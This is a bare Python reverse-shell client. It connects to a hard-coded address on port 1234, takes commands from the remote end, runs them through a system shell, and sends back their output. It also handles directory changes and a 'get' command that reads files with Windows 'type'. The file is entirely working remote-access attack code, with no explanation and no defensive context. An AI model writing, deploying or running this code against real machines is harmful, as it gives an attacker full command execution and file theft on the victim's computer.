import socket
import sys
import subprocess
import os
import re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "10.1.254.98"
port = 1234
s.connect((host, port))

while True:
    data = s.recv(1024).decode()
    #print(data)
    try:    
        if data[:2] == "cd":
            res = data[3:]
            _res = re.split(r'[\\/]', res)
            os.chdir((os.getcwd() + "\\" + "\\".join(_res))[:-1])
        if data[:3] == "get":
            mask = "type " + data[4:] + "\n"
            print(mask)
            cmd = subprocess.Popen(mask[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            pwd = str(os.getcwd()) + ">>"
            s.send(cmd.stdout.read())
            s.send(pwd.encode())
        elif len(data) > 0:
            cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            pwd = str(os.getcwd()) + ">>"
            s.send(cmd.stdout.read() + pwd.encode())
    except:
        s.send(cmd.stderr.read() + pwd.encode())
s.close()